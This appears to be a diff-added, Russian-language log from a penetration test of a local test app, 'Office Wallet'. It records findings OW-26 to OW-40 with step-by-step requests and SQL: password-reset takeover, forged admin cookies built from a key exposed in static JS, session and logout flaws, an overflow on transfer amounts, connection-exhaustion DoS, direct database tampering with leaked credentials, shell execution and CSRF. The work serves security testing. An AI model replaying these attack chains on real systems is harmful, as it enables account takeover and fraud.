+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/2 ---
+== OW-26 · reset code не истекает и не гасится после использования ==
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot login=adminw
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → SQL SELECT id||'|'||sms_code FROM password_resets WHERE user_id=(SELECT id FROM users WHERE login='adminw') ORDER BY id DESC LIMIT 1
+    ← psql 44|647432
+    → SQL UPDATE password_resets SET created_at='2000-01-01', used=FALSE WHERE id=44
+    ← psql UPDATE 1
+    → POST /password/reset with 26-year-old reset code rid=44
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT used FROM password_resets WHERE id=44
+    ← psql t
+    → POST same /password/reset rid=44 again
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Новый пароль · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    ┌─ АРТЕФАКТ · OW-26 · просроченный reset принят
+    │ password_resets.created_at=2000-01-01; запрос не проверил срок
+    │ первый POST /password/reset → HTTP 200; новый пароль принят
+    │ после первого использования used=t; повторный POST → HTTP 200, второй пароль отклонён
+    └─
+[+] старый reset не истекает; после использования код помечается использованным
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL DELETE FROM password_resets WHERE id=44
+    ← psql DELETE 1
+    → SQL DELETE FROM sms_outbox WHERE rid=44
+    ← psql DELETE 1
+    → SQL DELETE FROM mail_outbox WHERE body LIKE '%rid=44%'
+    ← psql DELETE 1
+    OW-26: исходный password_hash восстановлен; reset/outbox записи удалены
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-27
+################################################################################################
+--- проверка 1/3 ---
+== 3. OW-26/OW-27: полный захват пароля жертвы через сброс ==
+    · Сброс чужого пароля собирается из трёх кусков, и все три уже у нас:
+    ·  1) ссылка уходит на почту жертвы, но /mail отдаёт весь outbox любому вошедшему
+    ·     (handlers_auth.go:181-200) — забираем её оттуда;
+    ·  2) код подтверждения лежит в SMS-шлюзе, открытом кукой из шага 2;
+    ·  3) срок действия кода не проверяется и лимита попыток нет (handlers_auth.go:146).
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → POST /password/forgot  login=adminw (письмо и SMS уходят в общие ящики)
+    ← HTTP 302 redirect=http://localhost:18081/password/forgot  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сброс пароля · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.c...
+    → GET /mail  (весь outbox виден иванову)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → GET /gateway/sms  (код по заявке #43)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    ссылка: /password/reset?rid=43   код: 673407
+    → POST /password/reset  rid=43&sms_code=673407&password=Hack1234
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$7RaARAmS4/VeSpErIzadquTgcFRSRRRpafp9dEjpKQ2dulhMCa5R2
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-26/OW-27 · сброс сменил пароль жертвы
+    │ reset request rid=43 sms_code=<получен из gateway> → HTTP 200
+    │ password_hash изменён: $2a$10$.WcgUxFiEZL… → $2a$10$7RaARAmS4/V…
+    │ POST /login новым паролем → HTTP 302 (сессия выдана)
+    └─
+[+] пароль админа заменён, зашли: adminw / Hack1234
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/3 ---
+== 5. OW-27: вся почта компании в одном ящике ==
+    · /mail отдаёт весь mail_outbox любому вошедшему (handlers_auth.go:181-200):
+    · письма других людей, ссылки сброса паролей, служебные уведомления — без
+    · фильтра по адресату. Это вторая половина цепочки захвата пароля (stage_access).
+    → GET /mail  (весь outbox)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    писем в outbox: 37 (включая строку шапки)
+    тема: Сброс пароля
+    тема: Сброс пароля
+    тема: Сброс пароля
+    → SQL SELECT email FROM users WHERE login='ivanov'
+    ← psql ivanov@office.local
+    ┌─ АРТЕФАКТ · OW-27 · сотрудник видит почту других адресатов
+    │ GET /mail → HTTP 200; адрес текущего пользователя: ivanov@office.local
+    │ адреса в ответе: adminw@office.local, adminw@office.local, sidorov@office.local, adminw@office.local, adminw@office.local
+    │ письма/ссылки из общего mail_outbox отображены в одном ответе
+    └─
+[+] все письма видны без чужого адреса
+
+--- проверка 3/3 ---
+== OW-27 · сотрудник читает письма чужих адресатов ==
+    → GET /mail as employee
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Уведомления · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    → SQL SELECT email FROM users WHERE login='ivanov'
+    ← psql ivanov@office.local
+    ┌─ АРТЕФАКТ · OW-27 · общий outbox показывает чужие письма
+    │ GET /mail under ivanov <ivanov@office.local> → HTTP 200
+    │ чужие recipient в HTML: adminw@office.local, adminw@office.local, sidorov@office.local, adminw@office.local, adminw@office.local, adminw@office.local
+    └─
+[+] employee видит сообщения не своего почтового адреса
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-28
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-28/OW-35: фейк админ-куки: роль в подписи, ключ в статике ==
+    · При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль>).
+    · Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется
+    · (auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,
+    · поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен.
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c...
+    → GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-28/OW-35 · поддельная админ-сессия
+    │ подписанное значение: ow.6.admin.<HMAC>
+    │ GET /admin/secrets → HTTP 200; в ответе найден заголовок админки
+    └─
+[+] админка открыта без пароля
+    · Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей
+    · (админская страница, handlers_auth.go:158-179).
+    → GET /gateway/sms  (коды сброса паролей всех пользователей)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    код подтверждения сброса 144105
+    код подтверждения сброса 486357
+    код подтверждения сброса 914206
+    ┌─ АРТЕФАКТ · OW-28 · SMS-коды доступны под поддельной ролью
+    │ GET /gateway/sms → HTTP 200; извлечено строк кодов: 3
+    └─
+
+--- проверка 2/2 ---
+== 5. OW-28: блокировка пользователя не работает ==
+    · Бухгалтер может заблокировать сотрудника — флаг blocked есть в базе и в сессии
+    · читается, но нигде не проверяется: ни при входе, ни дальше по работе
+    · (auth.go:17-44, в handlers_auth.go проверки вообще нет). То есть блокировка —
+    · это косметика: человек продолжает работать, пока сам не выйдет.
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql f
+    → SQL UPDATE users SET blocked=TRUE WHERE login='ivanov' RETURNING login, blocked;
+    ← psql ivanov|t
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql t
+    ┌─ АРТЕФАКТ · OW-28 · blocked=true не запрещает аутентификацию
+    │ users.blocked: f → t
+    │ POST /login ivanov/workplace1 → HTTP 302; сессия выдана
+    └─
+[+] заблокированный всё равно входит
+    ← старая сессия тоже жива: HTTP 200
+    → SQL UPDATE users SET blocked=FALSE WHERE login='ivanov' RETURNING login, blocked;
+    ← psql ivanov|f
+    UPDATE 1
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql f
+    после теста blocked=f
+    ivanov разблокирован обратно
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-29
+################################################################################################
+== 7. OW-29: выход не отзывает сессию на сервере ==
+    · Logout только ставит пустую куку в браузере (auth.go:64-66) — на сервере
+    · ничего не хранится и не отзывается: кука подписана ключом и живёт, пока
+    · жив браузер. Значит украденная кука работает и после того, как жертва
+    · нажала «Выход», и через год — срока у сессии нет вовсе (OW-29).
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    украденная кука: ow_session=ow.1.admin.888b25bca7475...
+    → GET /logout  (жертва выходит)
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → GET /  той же кукой ПОСЛЕ выхода
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-29 · cookie не отозвана logout
+    │ GET /logout → браузер получил пустую cookie, копия украденной сохранена
+    │ повторный GET / с прежним ow_session → HTTP 200, кабинет доступен
+    └─
+[+] кука после logout всё ещё открывает кабинет — отзыв только на клиенте
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-30
+################################################################################################
+== 7. OW-30: кука без HttpOnly: сессия читается из JavaScript ==
+    · Всё предыдущее имеет смысл только потому, что в cookie нет флага HttpOnly
+    · (auth.go:59) — значит document.cookie отдаёт ow_session целиком, без
+    · дополнительных дыр. Смотрим заголовок при входе:
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    Set-Cookie: ow_session=ow.1.admin.888b25bca7475d932c148464a139cf1ac039a3678c212962c04ee3b44958b899; Path=/; SameSite=Lax
+    ┌─ АРТЕФАКТ · OW-30 · ow_session без HttpOnly
+    │ Set-Cookie: ow_session=ow.1.admin.888b25bca7475d932c148464a139cf1ac039a3678c212962c04ee3b44958b899; Path=/; SameSite=Lax
+    │ HttpOnly flag = absent; document.cookie сможет прочитать сессионный токен
+    └─
+[+] HttpOnly отсутствует: украденная кука = полная сессия жертвы
+    · Итог цепочки: жертва открывает ссылку /history?q=<ScRiPt>... (или карточку
+    · чаевых) → скрипт исполняется в её браузере → document.cookie с ow_session
+    · уходит атакующему → всё, что умеет жертва, включая её роль. Здесь мы
+    · фиксим, что фильтр пропускает payload и что кука читается из JS.
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-31
+################################################################################################
+== 8. OW-31: переполнение рублей в копейки при переводе ==
+    · parseRubToKop умножает рубли на 100 без проверки границ (render.go:52-80):
+    · ri*100 выходит за int64 и молча заворачивается. Вводим 4611686018427387914
+    · рублей (4.6 квинтиллиона) — в черновике оказывается 1000 копеек. Ни сумма,
+    · ни границы парсер не проверяет, а котировка/черновик уже считается «рабочим».
+    → POST /transfer/new  recipient=petrova amount_rub=4611686018427387914 (4.6 квинтиллиона рублей)
+    ← HTTP 302 redirect=http://localhost:18081/transfer/confirm?draft_id=35  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение перевода · Office Wallet</title>   <link rel="preconnect" href="https://fonts.go...
+    → SQL SELECT id||' '||amount_kop FROM transfer_drafts ORDER BY id DESC LIMIT 1;
+    ← psql 35 1000
+    ┌─ АРТЕФАКТ · OW-31 · переполнение рублей в копейки
+    │ ввод: 4611686018427387914 руб.; transfer_drafts: id|amount_kop = 35 1000
+    │ ожидаемый артефакт: сумма превратилась в 1000 коп вместо переполнения/отказа
+    └─
+[+] черновик #35: amount_kop=1000 (10₽) вместо 4.6 квинтиллионов — переполнение прошло
+    · Черновик дальше не подтверждаем — нам важен сам факт: парсер принял
+    · заведомо нелепую сумму и превратил её в другое число.
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-32
+################################################################################################
+--- проверка 1/4 ---
+== OW-32: обычный запрос до атаки ==
+GET /login -> 200 за 0.01s
+
+--- проверка 2/4 ---
+== OW-32: 110 параллельных запросов с pg_sleep(8) ==
+
+--- проверка 3/4 ---
+== OW-32: обычный запрос во время удержания 110 соединений с БД ==
+GET /login -> 200 за 0.00s
+ответов: 110, не-200: 100, из них 'too many clients': 0, заняло 8.1s
+┌─ АРТЕФАКТ · OW-32
+│ concurrent requests: 110; non-200: 100; too-many-clients: 0
+│ обычный логин во время исчерпания соединений — см. измерение выше
+└─
+[+] неограниченный пул исчерпал max_connections=100: 100 ответов не-200
+  пример ответа: 200
+  пример ответа: sleep-done
+
+--- проверка 4/4 ---
+== OW-32: после завершения ==
+GET /login -> 200 за 0.00s (БД отдохнула, пул самовосстановился)
+
+БД освободится сама через ~8 с (pg_sleep завершится)
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-33
+################################################################################################
+--- проверка 1/3 ---
+== OW-33: до атаки ==
+GET /login -> 200 за 0.01s
+
+--- проверка 2/3 ---
+== OW-33: держим 120 соединений 6 секунд (байты шлём раз в 3с) ==
+соединений удерживается: 120 (упало по сети: 0)
+если сервер закрыл 0 — ReadHeaderTimeout отсутствует и fd висят вечно
+┌─ АРТЕФАКТ · OW-33
+│ соединения удерживаются: 120; закрыты сервером: 0; probe до атаки: 200
+└─
+[+] сервер держит незавершённые заголовки: ReadHeaderTimeout отсутствует
+
+--- проверка 3/3 ---
+== OW-33: после атаки ==
+GET /login -> 200 за 0.01s
+GET /login -> 200 за 0.00s
+GET /login -> 200 за 0.00s
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-34
+################################################################################################
+--- проверка 1/2 ---
+== 4. OW-34: смена пароля напрямую в базе ==
+    · Второй способ, вообще без приложений и SMS: пароль БД wallet/wallet лежит в
+    · docker-compose.yml, порт открыт в сети compose (sslmode=disable). Обратного
+    · чтения bcrypt нет, но хеш заменяется на любой. Расширения pgcrypto в базе нет,
+    · поэтому готовый хеш не генерируем, а копируем: ставим жертве пароль, который
+    · мы и так знаем от ivanov.
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → SQL UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE login='ivanov') WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$DQdYa8ulSNI7ufNE7g.wIOwauAGuRjefvh4HpI6l5.yBULozjV9uy
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-34 · прямая запись в таблицу пользователей
+    │ hash жертвы изменён: $2a$10$.WcgUxFiEZL… → скопирован hash ivanov=$2a$10$DQdYa8ulSNI…
+    │ POST /login victim/workplace1 → HTTP 302; вход успешен
+    └─
+[+] зашли: adminw / workplace1 — пароль иванова стал паролем админа
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/2 ---
+== 7. OW-34: прямой доступ к базе по паролю из репозитория ==
+    · DSN с паролем wallet/wallet лежит в docker-compose.yml, sslmode=disable,
+    · порт базы открыт в сети compose — подключается любая машина в ней. Приложение
+    · не участвует: можно читать и переписывать всё в обход любого его кода.
+    → psql -h db -U wallet -d wallet   (DSN postgres://wallet:wallet@db:5432/wallet)
+    → SQL SELECT login||' | '||role||' | '||left(password_hash,20)||'...' FROM users ORDER BY id;
+    ← psql ivanov | admin | $2a$10$DQdYa8ulSNI7u...
+    petrova | employee | $2a$10$3yRGTpVXg0YsQ...
+    sidorov | employee | $2a$10$m.GFGJUh6MIMP...
+    kassa | cashier | $2a$10$Zssjo8K34d6Bw...
+    buch | accountant | $2a$10$k2hQU0/WUG56e...
+    adminw | admin | $2a$10$.WcgUxFiEZL4a...
+    ow24test | employee | ...
+    ┌─ АРТЕФАКТ · OW-34 · учётные данные БД дают прямое чтение
+    │ docker exec … psql -U wallet -d wallet → SELECT users
+    │ ivanov | admin | $2a$10$DQdYa8ulSNI7u...
+    │ petrova | employee | $2a$10$3yRGTpVXg0YsQ...
+    │ sidorov | employee | $2a$10$m.GFGJUh6MIMP...
+    │ kassa | cashier | $2a$10$Zssjo8K34d6Bw...
+    │ buch | accountant | $2a$10$k2hQU0/WUG56e...
+    └─
+[+] подключение к БД в обход приложения вернуло строки пользователей
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-35
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-28/OW-35: фейк админ-куки: роль в подписи, ключ в статике ==
+    · При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль>).
+    · Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется
+    · (auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,
+    · поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен.
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c...
+    → GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-28/OW-35 · поддельная админ-сессия
+    │ подписанное значение: ow.6.admin.<HMAC>
+    │ GET /admin/secrets → HTTP 200; в ответе найден заголовок админки
+    └─
+[+] админка открыта без пароля
+    · Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей
+    · (админская страница, handlers_auth.go:158-179).
+    → GET /gateway/sms  (коды сброса паролей всех пользователей)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    код подтверждения сброса 144105
+    код подтверждения сброса 486357
+    код подтверждения сброса 914206
+    ┌─ АРТЕФАКТ · OW-28 · SMS-коды доступны под поддельной ролью
+    │ GET /gateway/sms → HTTP 200; извлечено строк кодов: 3
+    └─
+
+--- проверка 2/2 ---
+== OW-35 · секрет подписи сессии извлекается из публичной статики ==
+    → GET /static/wallet.js
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → GET /admin/secrets с OW-35 HMAC
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-35 · публичная статика раскрыла ключ подписи
+    │ GET /static/wallet.js → HTTP 200; keyParts="office", "-", "wallet"
+    │ GET /static/legacy-sync.js → HTTP 200; tail="-", "session", "-", "key"
+    │ собран SESSION_KEY=office-wallet-session-key; поддельная admin cookie → HTTP 200
+    └─
+[+] секрет из публичных JS позволяет подписать admin cookie
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-36
+################################################################################################
+== OW-36 · CI helper печатает созданные секреты в job stdout ==
+    ┌─ АРТЕФАКТ · OW-36 · секреты выведены в stdout CI job
+    │ git show 5c6b209:ci/app-credentials.sh (версия до фикса) + fake kubectl; exit=0
+    │ DB_PASSWORD=<секрет напечатан в stdout>
+    │ APP_SESSION_KEY=<секрет напечатан в stdout>
+    │ APP_PAYMENT_KEY=<секрет напечатан в stdout>
+    │ текущая версия в дереве: секретов в stdout нет (0 строк) — закрыто фиксом
+    │ секретные значения в артефакт не выводятся; важен сам факт печати в job log
+    └─
+[+] до фикса helper печатал 3 секрета в job stdout; текущая версия не печатает
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-37
+################################################################################################
+== OW-37 · журнал операций доступен роли employee ==
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → SQL UPDATE users SET role='employee' WHERE login='ivanov' RETURNING role;
+    ← psql employee
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → GET /ops/journal под role=employee
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Журнал · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    ┌─ АРТЕФАКТ · OW-37 · employee прочитал служебный ops.log
+    │ users.role=employee; GET /ops/journal → HTTP 200
+    │ в ответе присутствует notify-redeem wallet-ops-9c2e и uname output
+    └─
+[+] служебный журнал доступен без admin-роли
+    → SQL UPDATE users SET role='admin' WHERE login='ivanov' RETURNING role;
+    ← psql admin
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-38
+################################################################################################
+== OW-38 · в обработчике уведомлений запускается shell-команда ==
+    → GET /ops/journal (результат notify redeem)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Журнал · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    ┌─ АРТЕФАКТ · OW-38 · shell-вызов оставил артефакт в журнале
+    │ код handler вызывает sh -c 'uname -a' после ticket из redirect
+    │ GET /ops/journal → HTTP 200
+    │ вывод команды: Linux 4a1860a837ac 7.0.14-linuxkit #1 SMP PREEMPT Sun Sep 20 16:14:09 UTC 2026 aarch64 GNU/Linux
+    └─
+[+] обработчик вызвал shell и записал вывод команды в ops.log
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-39
+################################################################################################
+== OW-39 · канал supply раскрывается в каталоге ==
+    → GET /api/catalog (JSON + заголовок второй половины канала)
+    ← HTTP 200 {"items":[{"id":1,"code":"COFFEE","title":"Кофе в зернах 250г","price_kop":45000},{"id":2,"code":"TEA","title":"Чай листовой","price_kop":32000},{"id":3,"code":"SNACK","title":"Набор снеков","price_kop":27000},{"id":4,"code":"MUG","title":"...
+    ┌─ АРТЕФАКТ · OW-39 · собран секретный supply-channel
+    │ GET /api/catalog → HTTP 200
+    │ JSON meta.ch_pref=377f2706b6; X-Wallet-Sync-Part=37319fc615
+    │ собранный X-Wallet-Channel=377f2706b637319fc615
+    └─
+[+] две части внутреннего токена доступны без отдельной авторизации
+
+================================================================================================
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-40
+################################################################################################
+== OW-40 · POST без CSRF-токена принимается с посторонним Origin ==
+    → SQL SELECT display_name||'|'||email FROM users WHERE login='ivanov'
+    ← psql Иван Иванов|ivanov@office.local
+    → POST /profile Origin=https://attacker.invalid (без токена)
+    ← HTTP 302 redirect=http://localhost:18081/profile  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Профиль · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT display_name||'|'||email FROM users WHERE login='ivanov'
+    ← psql OW40-CSRF|ivanov@x.local
